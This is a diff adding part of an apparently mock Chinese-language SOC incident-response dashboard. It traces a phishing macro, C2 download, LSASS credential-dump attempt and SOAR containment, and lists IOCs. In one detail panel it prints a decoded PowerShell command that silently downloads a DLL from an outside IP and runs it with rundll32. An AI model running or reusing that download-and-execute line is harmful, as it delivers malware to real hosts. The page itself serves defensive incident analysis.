+                <button onclick="toggleDetails('node1-details')" class="text-xs font-mono text-cyan-400 hover:text-cyan-300 flex items-center space-x-1">
+                  <span>展开原始日志与附件特征</span>
+                  <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m6 9 6 6 6-6"/></svg>
+                </button>
+              </div>
+
+              <p class="text-xs text-slate-200 leading-relaxed mb-2.5">
+                市场部财务专员终端 <code class="px-1 py-0.5 rounded bg-slate-900 text-cyan-300 font-mono">host-fin-04</code> (登录账号: <code class="text-amber-300 font-mono">CORP\lisa.m</code>) 接收到伪装成供应商对账单的恶意邮件，打开宏启用附件 <code class="px-1 py-0.5 rounded bg-red-950/60 text-red-300 font-mono">invoice_update.xlsm</code>。
+              </p>
+
+              <!-- 核心指标标签 -->
+              <div class="flex flex-wrap items-center gap-2 text-[11px] font-mono text-slate-400">
+                <span class="bg-slate-900/90 px-2 py-1 rounded border border-slate-800">发件人: billing@partner-supply-portal.com</span>
+                <span class="bg-slate-900/90 px-2 py-1 rounded border border-slate-800">邮件网关: Proofpoint 放行 (新注册域绕过)</span>
+                <span class="bg-slate-900/90 px-2 py-1 rounded border border-slate-800 text-amber-400">SHA256: 7f8a3d...e91c</span>
+              </div>
+
+              <!-- 展开抽屉日志 -->
+              <div id="node1-details" class="hidden mt-3 p-3 rounded bg-slate-950 border border-slate-800/80 font-mono text-[11px] text-slate-300 space-y-2">
+                <div class="flex items-center justify-between text-slate-400 pb-1 border-b border-slate-800">
+                  <span>Sysmon Event 1: Process Creation Telemetry</span>
+                  <button onclick="copyCode(this, 'sysmon-node1')" class="text-cyan-400 hover:underline">复制代码</button>
+                </div>
+                <pre id="sysmon-node1" class="text-slate-400 overflow-x-auto p-1 leading-snug">
+ParentProcess: "C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"
+ProcessId: 4892
+CommandLine: "EXCEL.EXE" /automation -Embedding "C:\Users\lisa.m\Downloads\invoice_update.xlsm"
+VBA_Macro_Extracted: "Sub Auto_Open() -> Call DecryptPayloadAndExec -> cmd.exe /c start ..."
+User: "CORP\lisa.m" | IntegrityLevel: Medium | SHA256: 7f8a3db42a9810c9c2f6d0fbe872391ce91c28fa4d92019a
+                </pre>
+              </div>
+            </div>
+          </div>
+
+          <!-- 节点 2: 宏执行与反弹木马下载 -->
+          <div class="timeline-item relative group" data-category="network" data-od-id="timeline-node-2">
+            <div class="absolute -left-7 top-1.5 w-6 h-6 rounded-full bg-red-950 border-2 border-red-500 flex items-center justify-center text-red-300 font-mono text-[10px] font-bold shadow-lg shadow-red-500/30">
+              02
+            </div>
+            <div class="p-3.5 rounded-lg bg-[#111A2E] border border-slate-800 hover:border-slate-700 transition-all">
+              <div class="flex flex-wrap items-center justify-between gap-2 mb-2">
+                <div class="flex items-center space-x-2">
+                  <span class="text-xs font-mono font-bold text-red-400">10:22:15 CST</span>
+                  <span class="px-2 py-0.5 rounded text-[11px] font-mono bg-red-500/10 text-red-300 border border-red-500/30 font-semibold">
+                    [脚本执行] T1059.001 PowerShell 无文件内存反射加载
+                  </span>
+                  <span class="px-1.5 py-0.2 rounded text-[10px] font-mono bg-red-950 text-red-400 border border-red-800/40">C2 连接已建立</span>
+                </div>
+                <button onclick="toggleDetails('node2-details')" class="text-xs font-mono text-cyan-400 hover:text-cyan-300 flex items-center space-x-1">
+                  <span>查看 Base64 解码指令与网络回连</span>
+                  <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m6 9 6 6 6-6"/></svg>
+                </button>
+              </div>
+
+              <p class="text-xs text-slate-200 leading-relaxed mb-2.5">
+                母进程 <code class="text-amber-300 font-mono">EXCEL.EXE (PID: 4892)</code> 生成隐藏子进程 <code class="text-cyan-300 font-mono">powershell.exe (PID: 7712)</code>，通过 Base64 混淆指令发起外联，从恶意 C2 地址 <code class="text-red-400 font-mono font-bold">185.220.101.45:8443</code> 下载二阶段木马载荷并写入 <code class="text-slate-300 font-mono">C:\Users\Public\update_sync.dll</code>。
+              </p>
+
+              <div class="flex flex-wrap items-center gap-2 text-[11px] font-mono text-slate-400">
+                <span class="bg-slate-900/90 px-2 py-1 rounded border border-slate-800 text-red-400 font-semibold">C2 IP: 185.220.101.45 (NL - Tor Exit Node)</span>
+                <span class="bg-slate-900/90 px-2 py-1 rounded border border-slate-800">关联域名: api-sync-cdn.org</span>
+                <span class="bg-slate-900/90 px-2 py-1 rounded border border-slate-800">回传端口: TCP 8443 (伪装 TLS 1.3)</span>
+              </div>
+
+              <div id="node2-details" class="hidden mt-3 p-3 rounded bg-slate-950 border border-slate-800/80 font-mono text-[11px] text-slate-300 space-y-2">
+                <div class="flex items-center justify-between text-slate-400 pb-1 border-b border-slate-800">
+                  <span>Decoded PowerShell Payload (混淆解码分析)</span>
+                  <span class="text-red-400 text-[10px]">EDR 探针已捕获并告警</span>
+                </div>
+                <div class="bg-slate-900 p-2 rounded text-emerald-400 overflow-x-auto text-[11px]">
+powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri 'https://185.220.101.45:8443/sync/update_sync.dll' -Headers @{'X-Session-Token'='apt29-tok-991'} -OutFile 'C:\Users\Public\update_sync.dll'; Start-Process rundll32.exe 'C:\Users\Public\update_sync.dll,EntryPoint'"
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- 节点 3: 内存抓取 Mimikatz -->
+          <div class="timeline-item relative group" data-category="endpoint" data-od-id="timeline-node-3">
+            <div class="absolute -left-7 top-1.5 w-6 h-6 rounded-full bg-red-950 border-2 border-red-500 flex items-center justify-center text-red-300 font-mono text-[10px] font-bold shadow-lg shadow-red-500/30">
+              03
+            </div>
+            <div class="p-3.5 rounded-lg bg-[#111A2E] border border-slate-800 hover:border-slate-700 transition-all">
+              <div class="flex flex-wrap items-center justify-between gap-2 mb-2">
+                <div class="flex items-center space-x-2">
+                  <span class="text-xs font-mono font-bold text-red-400">10:35:40 CST</span>
+                  <span class="px-2 py-0.5 rounded text-[11px] font-mono bg-red-500/20 text-red-300 border border-red-500/40 font-semibold">
+                    [凭据转储] T1003.001 Mimikatz 尝试注入 LSASS 进程
+                  </span>
+                  <span class="px-1.5 py-0.2 rounded text-[10px] font-mono bg-blue-500/10 text-cyan-300">严重拦截</span>
+                </div>
+                <button onclick="toggleDetails('node3-details')" class="text-xs font-mono text-cyan-400 hover:text-cyan-300 flex items-center space-x-1">
+                  <span>查看 Sysmon Event 10 内存注入取证</span>
+                  <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m6 9 6 6 6-6"/></svg>
+                </button>
+              </div>
+
+              <p class="text-xs text-slate-200 leading-relaxed mb-2.5">
+                进程 <code class="text-cyan-300 font-mono">rundll32.exe (PID: 8104)</code> 调用底层 API <code class="text-amber-300 font-mono">OpenProcess(PROCESS_VM_READ | 0x1F0FFF)</code> 尝试读取内存敏感进程 <code class="text-red-400 font-mono font-bold">lsass.exe</code>，意图窃取当前内存中的 NTLM 散列与 Kerberos TGT 票据。SentinelOne EDR 探针触发内核级防护切断句柄。
+              </p>
+
+              <div class="flex flex-wrap items-center gap-2 text-[11px] font-mono text-slate-400">
+                <span class="bg-slate-900/90 px-2 py-1 rounded border border-slate-800 text-emerald-400">EDR 动作: 阻止句柄访问 (Access Denied)</span>
+                <span class="bg-slate-900/90 px-2 py-1 rounded border border-slate-800">目标进程: C:\Windows\System32\lsass.exe (PID: 672)</span>
+                <span class="bg-slate-900/90 px-2 py-1 rounded border border-slate-800 text-red-400 font-semibold">涉嫌凭证: CORP\lisa.m & CORP\krbtgt</span>
+              </div>
+
+              <div id="node3-details" class="hidden mt-3 p-3 rounded bg-slate-950 border border-slate-800/80 font-mono text-[11px] text-slate-300 space-y-2">
+                <div class="text-slate-400 pb-1 border-b border-slate-800">Sysmon Event 10 (ProcessAccess) 遥测片段</div>
+                <pre class="text-slate-400 overflow-x-auto p-1 leading-snug">
+SourceImage: "C:\Windows\System32\rundll32.exe"
+SourceProcessId: 8104
+TargetImage: "C:\Windows\System32\lsass.exe"
+TargetProcessId: 672
+GrantedAccess: 0x1010 (PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ)
+CallTrace: "C:\Windows\SYSTEM32\ntdll.dll+0xa0344|C:\Windows\System32\KERNELBASE.dll+0x2c64e|C:\Users\Public\update_sync.dll+0x145a2"
+Verdict: MITRE ATT&CK T1003.001 In-Memory Mimikatz Pattern Matched.
+                </pre>
+              </div>
+            </div>
+          </div>
+
+          <!-- 节点 4: SOAR 自动化遏制 -->
+          <div class="timeline-item relative group" data-category="soar" data-od-id="timeline-node-4">
+            <div class="absolute -left-7 top-1.5 w-6 h-6 rounded-full bg-cyan-950 border-2 border-cyan-400 flex items-center justify-center text-cyan-300 font-mono text-[10px] font-bold shadow-lg shadow-cyan-500/30">
+              04
+            </div>
+            <div class="p-3.5 rounded-lg bg-[#0E1B2E] border border-cyan-800/60 hover:border-cyan-700 transition-all">
+              <div class="flex flex-wrap items-center justify-between gap-2 mb-2">
+                <div class="flex items-center space-x-2">
+                  <span class="text-xs font-mono font-bold text-cyan-400">10:48:00 CST</span>
+                  <span class="px-2 py-0.5 rounded text-[11px] font-mono bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 font-semibold flex items-center gap-1">
+                    <svg class="w-3 h-3 text-cyan-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+                    [SOAR 自动化遏制] 剧本自动触发并成功执行
+                  </span>
+                  <span class="px-1.5 py-0.2 rounded text-[10px] font-mono bg-emerald-500/20 text-emerald-400">剧本耗时 1.4秒</span>
+                </div>
+                <button onclick="toggleDetails('node4-details')" class="text-xs font-mono text-cyan-400 hover:text-cyan-300 flex items-center space-x-1">
+                  <span>查看剧本执行流水与防火墙下发</span>
+                  <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m6 9 6 6 6-6"/></svg>
+                </button>
+              </div>
+
+              <p class="text-xs text-slate-200 leading-relaxed mb-2.5">
+                自动化剧本 <code class="text-cyan-300 font-mono">PB-RANSOM-CONTAIN-04</code> 触发：协同 EDR 强制网络隔离 <code class="text-amber-300 font-mono">host-fin-04</code>（仅保留 443 SOC 管理控制信道），向全网 Palo Alto 防火墙与 Core DNS 下发 C2 域名 <code class="text-red-400 font-mono">api-sync-cdn.org</code> 与 IP <code class="text-red-400 font-mono">185.220.101.45</code> 的全网即时阻断黑名单。
+              </p>
+
+              <div class="flex flex-wrap items-center gap-2 text-[11px] font-mono text-slate-400">
+                <span class="bg-slate-900/90 px-2 py-1 rounded border border-slate-800 text-emerald-400 font-bold">主机隔离状态: 已生效 (Network Quarantined)</span>
+                <span class="bg-slate-900/90 px-2 py-1 rounded border border-slate-800">下发防火墙: Palo Alto NGFW (Cluster-01, 02)</span>
+                <span class="bg-slate-900/90 px-2 py-1 rounded border border-slate-800">DNS Sinkhole: 成功重定向至 127.0.0.1</span>
+              </div>
+
+              <div id="node4-details" class="hidden mt-3 p-3 rounded bg-slate-950 border border-slate-800/80 font-mono text-[11px] text-slate-300 space-y-1.5">
+                <div class="text-slate-400 pb-1 border-b border-slate-800">SOAR Playbook Execution Trace:</div>
+                <div class="text-slate-300">[Step 1] Verify Threat Level: CRITICAL (P1) -> PASS</div>
+                <div class="text-slate-300">[Step 2] SentinelOne EDR API: POST /web/api/v2.1/agents/isolate -> STATUS 200 OK (Agent: host-fin-04)</div>
+                <div class="text-slate-300">[Step 3] PAN-OS XML API: Add address object 185.220.101.45 to Blocklist_Dynamic -> COMMIT SUCCESS</div>
+                <div class="text-emerald-400">[Step 4] Notify On-Duty SOC Analyst Alex.Z via Slack & Webhook -> DELIVERED</div>
+              </div>
+            </div>
+          </div>
+
+          <!-- 节点 5: 分析师交接记录 -->
+          <div class="timeline-item relative group" data-category="human" data-od-id="timeline-node-5">
+            <div class="absolute -left-7 top-1.5 w-6 h-6 rounded-full bg-emerald-950 border-2 border-emerald-500 flex items-center justify-center text-emerald-300 font-mono text-[10px] font-bold shadow-lg shadow-emerald-500/30">
+              05
+            </div>
+            <div class="p-3.5 rounded-lg bg-[#111A2E] border border-slate-800 hover:border-slate-700 transition-all">
+              <div class="flex flex-wrap items-center justify-between gap-2 mb-2">
+                <div class="flex items-center space-x-2">
+                  <span class="text-xs font-mono font-bold text-emerald-400">11:10:00 CST</span>
+                  <span class="px-2 py-0.5 rounded text-[11px] font-mono bg-emerald-500/10 text-emerald-300 border border-emerald-500/30 font-semibold">
+                    [人工研判与交接] 分析师 Alex.Z 上传内存转储并完成初始研判
+                  </span>
+                  <span class="px-1.5 py-0.2 rounded text-[10px] font-mono bg-slate-800 text-slate-300">物证就绪</span>
+                </div>
+                <span class="text-xs font-mono text-slate-400">负责分析师: Alex Zhao</span>
+              </div>
+
+              <p class="text-xs text-slate-200 leading-relaxed mb-2">
+                分析师介入远程取证通道，通过 WinPmem 抽取受害主机内存镜像 <code class="text-cyan-300 font-mono">host-fin-04-memdump.raw</code> 并提取全量 Sysmon 审计切片。完成排查：未发现向内网域控 <code class="text-slate-300 font-mono">dc-corp-01</code> 发起 Kerberos 黄金票据横向传递迹象，攻击活动已被成功阻隔在终端单点。
+              </p>
+
+              <div class="flex flex-wrap items-center gap-2 text-[11px] font-mono text-slate-400">
+                <span class="bg-slate-900/90 px-2 py-1 rounded border border-slate-800">物证状态: 内存Dump (2.4 GB 已入库)</span>
+                <span class="bg-slate-900/90 px-2 py-1 rounded border border-slate-800 text-cyan-400">建议动作: 准备推进威胁遏制与账号重置</span>
+              </div>
+            </div>
+          </div>
+
+        </div>
+
+        <!-- ----------------- 关联数字证据沉淀区 (Evidence Vault) ----------------- -->
+        <div class="mt-6 pt-4 border-t border-slate-800/80" data-od-id="evidence-vault-section">
+          <div class="flex items-center justify-between mb-3">
+            <div class="flex items-center space-x-2">
+              <svg class="w-4 h-4 text-cyan-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="2" y="2" width="20" height="20" rx="5" ry="5"/>
+                <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"/>
+                <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"/>
+              </svg>
+              <h3 class="text-sm font-bold text-white uppercase tracking-wider">关联数字证据沉淀区 (Evidence Vault)</h3>
+            </div>
+            <!-- Tabs -->
+            <div class="flex items-center space-x-1 bg-slate-900 p-0.5 rounded-lg border border-slate-800 text-xs font-mono">
+              <button onclick="switchEvidenceTab('files')" id="tab-btn-files" class="px-3 py-1 rounded-md bg-blue-600 text-white font-medium">数字物证文件 (4)</button>
+              <button onclick="switchEvidenceTab('iocs')" id="tab-btn-iocs" class="px-3 py-1 rounded-md text-slate-400 hover:text-slate-200">失陷指标 IOC 清单 (12)</button>
+              <button onclick="switchEvidenceTab('tree')" id="tab-btn-tree" class="px-3 py-1 rounded-md text-slate-400 hover:text-slate-200">溯源拓扑图谱</button>
+            </div>
+          </div>
+
+          <!-- Tab 内容 1: 物证文件 -->
+          <div id="evidence-files-view" class="bg-slate-900/60 rounded-lg border border-slate-800 overflow-hidden">
+            <table class="w-full text-left text-xs font-mono">
+              <thead class="bg-slate-950/80 text-slate-400 uppercase text-[10px] border-b border-slate-800">
+                <tr>
+                  <th class="p-2.5">文件名称 / 描述</th>
+                  <th class="p-2.5">类型</th>
+                  <th class="p-2.5">文件大小</th>
+                  <th class="p-2.5">SHA256 哈希签名</th>
+                  <th class="p-2.5">威胁研判</th>
+                  <th class="p-2.5 text-right">操作</th>
+                </tr>
+              </thead>
+              <tbody class="divide-y divide-slate-800/60 text-slate-300">
+                <tr class="hover:bg-slate-800/30">
+                  <td class="p-2.5 font-medium text-white flex items-center space-x-2">
+                    <span class="text-cyan-400">📄</span>
+                    <span>host-fin-04-memdump.raw</span>
+                  </td>
+                  <td class="p-2.5 text-slate-400">内存转储 Dump</td>
+                  <td class="p-2.5">2.42 GB</td>
+                  <td class="p-2.5 text-slate-400 truncate max-w-[160px]" title="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855">e3b0c44298...7852b855</td>
+                  <td class="p-2.5"><span class="px-1.5 py-0.5 rounded bg-blue-500/10 text-cyan-300 text-[10px]">已提取进程特征</span></td>
+                  <td class="p-2.5 text-right">
+                    <button onclick="showToast('正在调取沙箱云端快照回溯分析...', 'info')" class="text-cyan-400 hover:underline">沙箱分析</button>
+                  </td>
+                </tr>
+                <tr class="hover:bg-slate-800/30">
+                  <td class="p-2.5 font-medium text-white flex items-center space-x-2">
+                    <span class="text-red-400">⚠️</span>
+                    <span>invoice_update.xlsm</span>
+                  </td>
+                  <td class="p-2.5 text-slate-400">恶意 VBA 宏文档</td>
+                  <td class="p-2.5">148 KB</td>
+                  <td class="p-2.5 text-slate-400 truncate max-w-[160px]">7f8a3db42a...e91c28fa</td>
+                  <td class="p-2.5"><span class="px-1.5 py-0.5 rounded bg-red-500/20 text-red-400 text-[10px] font-bold">VT 68/72 检出</span></td>
+                  <td class="p-2.5 text-right">
+                    <button onclick="showToast('已安全隔离并导出反编译宏代码', 'success')" class="text-cyan-400 hover:underline">代码检视</button>
+                  </td>
+                </tr>
+                <tr class="hover:bg-slate-800/30">
+                  <td class="p-2.5 font-medium text-white flex items-center space-x-2">
+                    <span class="text-amber-400">📦</span>
+                    <span>update_sync.dll</span>
+                  </td>
+                  <td class="p-2.5 text-slate-400">二阶段反弹木马</td>
+                  <td class="p-2.5">890 KB</td>
+                  <td class="p-2.5 text-slate-400 truncate max-w-[160px]">2a184bf41d...61c0d482</td>
+                  <td class="p-2.5"><span class="px-1.5 py-0.5 rounded bg-red-500/20 text-red-400 text-[10px] font-bold">VT 65/72 检出</span></td>
+                  <td class="p-2.5 text-right">
+                    <button onclick="showToast('已提取逆向导出表与硬编码 C2', 'info')" class="text-cyan-400 hover:underline">特征提取</button>
+                  </td>
+                </tr>
+                <tr class="hover:bg-slate-800/30">
+                  <td class="p-2.5 font-medium text-white flex items-center space-x-2">
+                    <span class="text-cyan-400">🌐</span>
+                    <span>pcap_traffic_1015-1050.pcapng</span>
+                  </td>
+                  <td class="p-2.5 text-slate-400">全流量抓包切片</td>
+                  <td class="p-2.5">142 MB</td>
+                  <td class="p-2.5 text-slate-400 truncate max-w-[160px]">91bc014a91...a1408cc1</td>
+                  <td class="p-2.5"><span class="px-1.5 py-0.5 rounded bg-slate-800 text-slate-300 text-[10px]">包含 C2 TLS 会话</span></td>
+                  <td class="p-2.5 text-right">
+                    <button onclick="showToast('已载入 Wireshark 核心流追踪器', 'info')" class="text-cyan-400 hover:underline">流量追踪</button>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <!-- Tab 内容 2: 失陷指标 IOC 表格 (默认隐藏) -->
+          <div id="evidence-iocs-view" class="hidden bg-slate-900/60 rounded-lg border border-slate-800 overflow-hidden">
+            <table class="w-full text-left text-xs font-mono">
+              <thead class="bg-slate-950/80 text-slate-400 uppercase text-[10px] border-b border-slate-800">
+                <tr>
+                  <th class="p-2.5">类型</th>
+                  <th class="p-2.5">失陷指标 (Indicator)</th>
+                  <th class="p-2.5">威胁情报关联</th>
+                  <th class="p-2.5">置信度</th>
+                  <th class="p-2.5">当前阻断状态</th>
+                  <th class="p-2.5 text-right">处置动作</th>
+                </tr>
+              </thead>
+              <tbody class="divide-y divide-slate-800/60 text-slate-300">
+                <tr class="hover:bg-slate-800/30">
+                  <td class="p-2.5 text-cyan-400">IPv4</td>
+                  <td class="p-2.5 font-bold text-red-400">185.220.101.45</td>
+                  <td class="p-2.5 text-slate-300">APT29 C2 / Tor 出口节点</td>
+                  <td class="p-2.5 text-red-400 font-bold">100%</td>
+                  <td class="p-2.5"><span class="px-1.5 py-0.5 rounded bg-emerald-950 text-emerald-400 border border-emerald-800 text-[10px]">已全局阻断</span></td>
+                  <td class="p-2.5 text-right"><span class="text-slate-500">已入黑名单</span></td>
+                </tr>
+                <tr class="hover:bg-slate-800/30">
+                  <td class="p-2.5 text-purple-400">Domain</td>
+                  <td class="p-2.5 font-bold text-red-400">api-sync-cdn.org</td>
+                  <td class="p-2.5 text-slate-300">动态 DNS 劫持 C2 域名</td>
+                  <td class="p-2.5 text-red-400 font-bold">98%</td>
+                  <td class="p-2.5"><span class="px-1.5 py-0.5 rounded bg-emerald-950 text-emerald-400 border border-emerald-800 text-[10px]">已全网 Sinkhole</span></td>
+                  <td class="p-2.5 text-right"><span class="text-slate-500">策略已生效</span></td>
+                </tr>
+                <tr class="hover:bg-slate-800/30">
+                  <td class="p-2.5 text-amber-400">SHA256</td>
+                  <td class="p-2.5 text-slate-200">7f8a3db42a9810c9c2f6d0fbe872391ce91c28fa4d92019a</td>
+                  <td class="p-2.5 text-slate-300">Trojan.Downloader.VBA.APT29</td>
+                  <td class="p-2.5 text-amber-400 font-bold">95%</td>
+                  <td class="p-2.5"><span class="px-1.5 py-0.5 rounded bg-emerald-950 text-emerald-400 border border-emerald-800 text-[10px]">EDR 特征库已查杀</span></td>
+                  <td class="p-2.5 text-right"><span class="text-slate-500">已分发至端点</span></td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <!-- Tab 内容 3: 溯源拓扑 (默认隐藏) -->
+          <div id="evidence-tree-view" class="hidden bg-slate-950 p-4 rounded-lg border border-slate-800 font-mono text-xs text-slate-300 space-y-3">
+            <div class="text-slate-400 pb-2 border-b border-slate-800 flex items-center justify-between">
+              <span>攻防进程执行链树状拓扑 (Process Execution Causality Tree)</span>
+              <span class="text-cyan-400 text-[11px]">可交互式追踪</span>
+            </div>
+            <div class="p-3 bg-slate-900/80 rounded border border-slate-800/80 space-y-2 text-[11px]">
+              <div class="flex items-center space-x-2 text-slate-300">
+                <span class="text-blue-400">📁 explorer.exe (PID: 2840)</span>
+                <span class="text-slate-500">──► 正常双击打开</span>
+              </div>
+              <div class="flex items-center space-x-2 pl-4 text-amber-300">
+                <span>└─ 📄 EXCEL.EXE (PID: 4892) [invoice_update.xlsm]</span>
+                <span class="text-red-400">──► 触发恶意 VBA 宏代码</span>
+              </div>
+              <div class="flex items-center space-x-2 pl-8 text-cyan-300">
+                <span>└─ ⚡ powershell.exe (PID: 7712) [-NoP -W Hidden ...]</span>
+                <span class="text-slate-500">──► 发起 C2 外联下载木马</span>
+              </div>
+              <div class="flex items-center space-x-2 pl-12 text-red-400 font-bold">
+                <span>└─ 💀 rundll32.exe (PID: 8104) [update_sync.dll]</span>
+                <span class="text-purple-400">──► [ATT&CK T1003.001] OpenProcess(lsass.exe) 尝试抓取内存散列</span>
+              </div>
+              <div class="flex items-center space-x-2 pl-16 text-emerald-400 font-semibold bg-emerald-950/40 p-1 rounded border border-emerald-800/40">
+                <span>🛡️ SentinelOne EDR Engine (PID: 1204) [Kernel Hook Intercepted -> Access Denied & Network Isolated]</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <!-- ----------------- [右栏] 分析师协同与处置流操作面板 (330px) ----------------- -->
+    <aside class="w-[330px] bg-[#0A0F1A] border-l border-slate-800/80 flex flex-col shrink-0 select-none z-10" data-od-id="case-actions-sidebar">
+
+      <!-- 快速应急响应工具箱 (Quick Containment Actions) -->
+      <div class="p-3.5 border-b border-slate-800/80 bg-gradient-to-b from-[#111A2E] to-[#0A0F1A]">
+        <div class="flex items-center justify-between mb-3">
+          <div class="flex items-center space-x-2">
+            <svg class="w-4 h-4 text-red-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+              <line x1="12" y1="9" x2="12" y2="13"/>
+              <line x1="12" y1="17" x2="12.01" y2="17"/>
+            </svg>
+            <span class="text-xs font-bold uppercase tracking-wider text-slate-200">应急处置工具箱</span>
+          </div>
+          <span class="text-[10px] font-mono text-cyan-400 bg-cyan-950 px-1.5 py-0.5 rounded border border-cyan-800">
+            SOAR 自动化联动
+          </span>
+        </div>
+
+        <!-- 动作按钮组 -->
+        <div class="space-y-2">
+          <!-- 一键下发主机网络隔离 -->
+          <div class="p-2 rounded-lg bg-slate-900 border border-slate-800 flex items-center justify-between">
+            <div class="flex flex-col">
+              <span class="text-xs font-semibold text-slate-200">主机网络强行隔离</span>
+              <span id="hostIsolationStatusText" class="text-[10px] text-emerald-400 font-mono">host-fin-04 已隔离</span>
+            </div>
+            <button onclick="toggleHostIsolation()" id="isolateBtn" class="px-2.5 py-1 rounded text-xs font-mono font-medium bg-red-600/30 hover:bg-red-600 text-red-300 hover:text-white border border-red-500/50 transition-all">
+              解除隔离
+            </button>
+          </div>
+
+          <!-- 一键重置涉案 AD 域账户 -->
+          <div class="p-2 rounded-lg bg-slate-900 border border-slate-800 flex items-center justify-between">
+            <div class="flex flex-col">
+              <span class="text-xs font-semibold text-slate-200">重置受害 AD 域账户</span>
+              <span class="text-[10px] text-slate-400 font-mono">CORP\lisa.m & 废除Kerberos</span>
+            </div>
+            <button onclick="resetAdAccount()" id="resetAccountBtn" class="px-2.5 py-1 rounded text-xs font-mono font-medium bg-amber-600/30 hover:bg-amber-600 text-amber-300 hover:text-white border border-amber-500/50 transition-all">
+              一键重置
+            </button>
+          </div>
+
+          <!-- 触发二次复查剧本 -->
+          <button onclick="runDeepTriage()" class="w-full py-2 px-3 rounded-lg bg-slate-800/80 hover:bg-slate-700/80 border border-slate-700 text-slate-200 text-xs font-medium flex items-center justify-center space-x-2 transition-all">
+            <svg class="w-3.5 h-3.5 text-cyan-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
+            <span>触发 SOAR 全量深度复查剧本</span>
+          </button>
+
+          <!-- 主 CTA: 生成事故调查报告 -->
+          <button onclick="openSbarModal()" class="w-full py-2.5 px-3 rounded-lg bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white text-xs font-bold shadow-lg shadow-blue-500/30 flex items-center justify-center space-x-2 transition-all">
+            <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
+            <span>生成并导出 SBAR 结单事故报告</span>
+          </button>
+        </div>
+      </div>
+
+      <!-- 处置响应专家组 (Incident Team) -->
+      <div class="px-3.5 py-2.5 border-b border-slate-800/80 bg-slate-950/40">
+        <div class="flex items-center justify-between text-[11px] font-medium text-slate-400 mb-2">
+          <span class="uppercase tracking-wider">联合响应组成员 (3)</span>
+          <button onclick="showToast('已向协同应急频道发送同步通知', 'info')" class="text-cyan-400 hover:underline">+ 增派专家</button>
+        </div>
+        <div class="space-y-1.5 text-xs">
+          <div class="flex items-center justify-between p-1.5 rounded bg-slate-900/60 border border-slate-800/60">
+            <div class="flex items-center space-x-2">
+              <span class="w-5 h-5 rounded-full bg-blue-600 text-[10px] font-mono font-bold flex items-center justify-center text-white">AZ</span>
+              <span class="text-slate-200">Alex Zhao</span>
+            </div>
+            <span class="text-[10px] font-mono text-cyan-400 bg-cyan-950/60 px-1.5 py-0.5 rounded">负责分析师 (L3)</span>
+          </div>
+          <div class="flex items-center justify-between p-1.5 rounded bg-slate-900/60 border border-slate-800/60">
+            <div class="flex items-center space-x-2">
+              <span class="w-5 h-5 rounded-full bg-purple-600 text-[10px] font-mono font-bold flex items-center justify-center text-white">SL</span>
+              <span class="text-slate-200">Sarah Lin</span>
+            </div>
+            <span class="text-[10px] font-mono text-slate-400">威胁狩猎专家</span>
+          </div>
+          <div class="flex items-center justify-between p-1.5 rounded bg-slate-900/60 border border-slate-800/60">
+            <div class="flex items-center space-x-2">
+              <span class="w-5 h-5 rounded-full bg-emerald-600 text-[10px] font-mono font-bold flex items-center justify-center text-white">CW</span>
+              <span class="text-slate-200">Chen Wei</span>
+            </div>
+            <span class="text-[10px] font-mono text-emerald-400">数字取证专家</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- 协同讨论与工单交接流 (Activity Feed) -->
+      <div class="flex-1 flex flex-col min-h-0 bg-[#0B111E]">
+        <div class="p-2.5 border-b border-slate-800 flex items-center justify-between">
+          <span class="text-xs font-bold uppercase tracking-wider text-slate-300">工单交接与协同讨论</span>
+          <span class="text-[10px] font-mono text-slate-400">按回车即时同步</span>
+        </div>
+
+        <!-- 评论历史列表 -->
+        <div class="flex-1 overflow-y-auto p-3 space-y-3" id="commentsContainer">
+          <div class="text-[11px] p-2 rounded bg-slate-900 border border-slate-800/80">
+            <div class="flex items-center justify-between mb-1">
+              <strong class="text-cyan-400 font-medium">Sarah Lin</strong>
+              <span class="text-[10px] text-slate-500 font-mono">11:15:20</span>
+            </div>
+            <p class="text-slate-300 leading-relaxed">
+              在 VT 关联到相似样本 <code class="text-amber-300 font-mono">APT29_Dukes_Variant_Sep26</code>，该 C2 归属荷兰机房，建议立即排查全网近 7 天是否有解析 <code class="text-cyan-300 font-mono">api-sync-cdn.org</code> 的记录。
+            </p>
+          </div>
+
